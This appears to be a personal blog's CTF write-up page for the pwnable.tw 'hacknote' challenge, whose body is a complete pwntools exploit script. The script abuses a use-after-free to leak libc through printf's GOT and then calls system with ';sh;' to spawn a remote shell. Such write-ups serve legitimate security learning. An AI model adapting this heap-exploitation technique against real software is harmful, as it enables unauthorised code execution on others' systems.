@@ -1,0 +1,386 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    
+<meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+<meta name="theme-color" content="#f8f5ec" />
+<meta name="msapplication-navbutton-color" content="#f8f5ec">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">
+
+
+
+  <meta name="description" content="Hacknote Writeup"/>
+
+
+
+
+  <meta name="keywords" content="heap overflow, pwn, CTF, pwnable.tw, Znight" />
+
+
+
+
+
+
+
+
+
+
+  <link rel="alternate" href="/default" title="Znight">
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=2.5.0" />
+
+
+
+<link rel="canonical" href="http://znight.sight/2017/11/20/hacknote-writeup/"/>
+
+
+<link rel="stylesheet" type="text/css" href="/css/style.css?v=2.5.0" />
+
+
+
+  <link rel="stylesheet" type="text/css" href="/lib/fancybox/jquery.fancybox.css" />
+
+
+
+
+  
+
+
+
+  <script id="baidu_push">
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+
+
+
+    <title> Hacknote Writeup - Znight </title>
+  </head>
+
+  <body><div id="mobile-navbar" class="mobile-navbar">
+  <div class="mobile-header-logo">
+    <a href="/." class="logo">Znight</a>
+  </div>
+  <div class="mobile-navbar-icon">
+    <span></span>
+    <span></span>
+    <span></span>
+  </div>
+</div>
+
+<nav id="mobile-menu" class="mobile-menu slideout-menu">
+  <ul class="mobile-menu-list">
+    
+      <a href="/">
+        <li class="mobile-menu-item">
+          
+          
+            Home
+          
+        </li>
+      </a>
+    
+      <a href="/archives/">
+        <li class="mobile-menu-item">
+          
+          
+            Archives
+          
+        </li>
+      </a>
+    
+      <a href="/tags/">
+        <li class="mobile-menu-item">
+          
+          
+            Tags
+          
+        </li>
+      </a>
+    
+      <a href="/categories">
+        <li class="mobile-menu-item">
+          
+          
+            Categories
+          
+        </li>
+      </a>
+    
+  </ul>
+</nav>
+
+    <div class="container" id="mobile-panel">
+      <header id="header" class="header"><div class="logo-wrapper">
+  <a href="/." class="logo">Znight</a>
+</div>
+
+<nav class="site-navbar">
+  
+    <ul id="menu" class="menu">
+      
+        <li class="menu-item">
+          <a class="menu-item-link" href="/">
+            
+            
+              Home
+            
+          </a>
+        </li>
+      
+        <li class="menu-item">
+          <a class="menu-item-link" href="/archives/">
+            
+            
+              Archives
+            
+          </a>
+        </li>
+      
+        <li class="menu-item">
+          <a class="menu-item-link" href="/tags/">
+            
+            
+              Tags
+            
+          </a>
+        </li>
+      
+        <li class="menu-item">
+          <a class="menu-item-link" href="/categories">
+            
+            
+              Categories
+            
+          </a>
+        </li>
+      
+    </ul>
+  
+</nav>
+
+      </header>
+
+      <main id="main" class="main">
+        <div class="content-wrapper">
+          <div id="content" class="content">
+            
+  
+  <article class="post">
+    <header class="post-header">
+      <h1 class="post-title">
+        
+          Hacknote Writeup
+        
+      </h1>
+
+      <div class="post-meta">
+        <span class="post-time">
+          2017-11-20
+        </span>
+        
+          <div class="post-category">
+            
+              <a href="/categories/write-up/">write-up</a>
+            
+          </div>
+        
+      </div>
+    </header>
+
+    
+    
+  <div class="post-toc" id="post-toc">
+    <h2 class="post-toc-title">Contents</h2>
+    <div class="post-toc-content">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#exp"><span class="toc-text">exp</span></a></li></ol>
+    </div>
+  </div>
+
+
+    <div class="post-content">
+      
+        <h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'solitw'</span>, <span class="string">'-h'</span>]</div><div class="line">context.arch = <span class="string">'x86'</span></div><div class="line">context.log_level = <span class="string">'DEBUG'</span></div><div class="line"></div><div class="line">host = <span class="string">'chall.pwnable.tw'</span></div><div class="line">port = <span class="number">10102</span></div><div class="line">io = remote(host, port)</div><div class="line">free_plt = <span class="number">0x080484A0</span></div><div class="line"><span class="comment"># system_offset = 0x3ada0</span></div><div class="line">system_offset = <span class="number">0x3a940</span></div><div class="line">printf_got = <span class="number">0x804a010</span></div><div class="line"><span class="comment"># printf_offset = 0x49670</span></div><div class="line">printf_offset = <span class="number">0x49020</span></div><div class="line">put_content = <span class="number">0x0804862B</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">addNote</span><span class="params">(size, content)</span>:</span></div><div class="line">    io.recvuntil(<span class="string">'Your choice :'</span>)</div><div class="line">    io.sendline(<span class="string">'1'</span>)</div><div class="line">    io.recvuntil(<span class="string">'Note size :'</span>)</div><div class="line">    io.sendline(str(size))</div><div class="line">    io.recvuntil(<span class="string">'Content :'</span>)</div><div class="line">    io.sendline(content)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">deleteNote</span><span class="params">(index)</span>:</span></div><div class="line">    io.recvuntil(<span class="string">'Your choice :'</span>)</div><div class="line">    io.sendline(<span class="string">'2'</span>)</div><div class="line">    io.recvuntil(<span class="string">'Index :'</span>)</div><div class="line">    io.sendline(str(index))</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">printNote</span><span class="params">(index)</span>:</span></div><div class="line">    io.recvuntil(<span class="string">'Your choice :'</span>)</div><div class="line">    io.sendline(<span class="string">'3'</span>)</div><div class="line">    io.recvuntil(<span class="string">'Index :'</span>)</div><div class="line">    io.sendline(str(index))</div><div class="line">    <span class="keyword">return</span> io.recvuntil(<span class="string">'\n'</span>)</div><div class="line"></div><div class="line"><span class="comment"># gdb.attach(io, '''</span></div><div class="line"><span class="comment"># b malloc</span></div><div class="line"><span class="comment"># b free</span></div><div class="line"><span class="comment"># ''')</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></div><div class="line">    <span class="comment"># leak libc first</span></div><div class="line">    addNote(<span class="number">8</span>, <span class="string">'A'</span>*<span class="number">7</span>)</div><div class="line">    addNote(<span class="number">16</span>, <span class="string">'A'</span>*<span class="number">15</span>)</div><div class="line">    deleteNote(<span class="number">0</span>)</div><div class="line">    deleteNote(<span class="number">1</span>)</div><div class="line">    addNote(<span class="number">8</span>, p32(put_content) + p32(printf_got))</div><div class="line">    io.recvuntil(<span class="string">'Invalid choice'</span>)</div><div class="line">    libc_base = u32(printNote(<span class="number">0</span>)[<span class="number">0</span>:<span class="number">4</span>]) - printf_offset</div><div class="line">    log.info(<span class="string">"get libc base addr : 0x%x"</span> % (libc_base))</div><div class="line">    deleteNote(<span class="number">2</span>)</div><div class="line">    addNote(<span class="string">'8'</span>,p32(libc_base+system_offset)+<span class="string">';sh;'</span>)</div><div class="line">    io.sendline(<span class="string">'3'</span>)</div><div class="line">    io.sendline(<span class="string">'0'</span>)</div><div class="line">    io.interactive()</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    main()</div></pre></td></tr></table></figure>
+
+      
+    </div>
+
+    
+      
+      
+
+
+
+      
+      
+    
+
+    
+      <footer class="post-footer">
+        
+          <div class="post-tags">
+            
+              <a href="/tags/hoverflow/">heap overflow</a>
+            
+              <a href="/tags/pwn/">pwn</a>
+            
+              <a href="/tags/CTF/">CTF</a>
+            
+              <a href="/tags/pwnable-tw/">pwnable.tw</a>
+            
+          </div>
+        
+        
+        
+  <nav class="post-nav">
+    
+    
+      <a class="next" href="/2017/11/19/dubblesort-write-up/">
+        <span class="next-text nav-default">Dubblesort Write Up</span>
+        <span class="prev-text nav-mobile">Next</span>
+        <i class="iconfont icon-right"></i>
+      </a>
+    
+  </nav>
+
+      </footer>
+    
+
+  </article>
+
+
+          </div>
+          
+  <div class="comments" id="comments">
+    
+  </div>
+
+
+        </div>  
+      </main>
+
+      <footer id="footer" class="footer">
+
+  <div class="social-links">
+    
+      
+        
+          <a href="mailto:leeeric053@gmail.com" class="iconfont icon-email" title="email"></a>
+        
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+        
+          <a href="http://github.com/Leeericent" class="iconfont icon-github" title="github"></a>
+        
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+    
+    
+      
+      <a href="/atom.xml" class="iconfont icon-rss" title="rss"></a>
+    
+  </div>
+
+
+<div class="copyright">
+  <span class="power-by">
+    Powered by <a class="hexo-link" href="https://hexo.io/">Hexo</a>
+  </span>
+  <span class="division">|</span>
+  <span class="theme-info">
+    Theme - 
+    <a class="theme-link" href="https://github.com/ahonn/hexo-theme-even">Even</a>
+  </span>
+
+  <span class="copyright-year">
+    
+    &copy; 
+    
+    2017
+
+    <span class="heart">
+      <i class="iconfont icon-heart"></i>
+    </span>
+    <span class="author">Lericent Lee</span>
+  </span>
+</div>
+
+      </footer>
+
+      <div class="back-to-top" id="back-to-top">
+        <i class="iconfont icon-up"></i>
+      </div>
+    </div>
+
+    
+  
+
+
+
+    
+  
+
+
+
+
+
+  
+    <script type="text/javascript" src="/lib/jquery/jquery-3.1.1.min.js"></script>
+  
+
+  
+    <script type="text/javascript" src="/lib/slideout/slideout.js"></script>
+  
+
+  
+    <script type="text/javascript" src="/lib/fancybox/jquery.fancybox.pack.js"></script>
+  
+
+
+    <script type="text/javascript" src="/js/src/even.js?v=2.5.0"></script>
+<script type="text/javascript" src="/js/src/bootstrap.js?v=2.5.0"></script>
+
+  </body>
+</html>
